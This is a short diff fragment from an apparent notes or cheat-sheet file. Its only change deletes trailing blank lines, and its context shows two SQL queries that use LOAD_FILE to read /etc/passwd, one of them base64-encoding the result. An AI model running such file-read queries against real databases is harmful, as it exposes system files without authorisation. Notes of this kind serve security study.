@@ -64,5 +64,3 @@ select LOAD_FILE("/etc/passwd");
 select TO_BASE64(LOAD_FILE("/etc/passwd"));
 
 ```
-
-
